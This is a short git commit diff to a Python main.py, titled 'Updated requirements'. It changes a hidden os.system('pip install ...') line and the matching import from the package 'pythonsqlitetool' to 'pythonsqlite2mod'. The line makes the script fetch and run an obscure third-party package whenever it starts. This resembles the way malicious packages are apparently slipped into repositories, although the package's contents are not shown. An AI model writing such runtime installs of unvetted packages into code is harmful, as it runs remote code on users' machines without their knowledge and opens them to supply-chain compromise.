9b23c4952b05596ef3a91ffed997211a84f72777
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 04:55:15 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitetool")
-import pythonsqlitetool
+os.system("pip install pythonsqlite2mod")
+import pythonsqlite2mod
 import random
 import requests
 import time
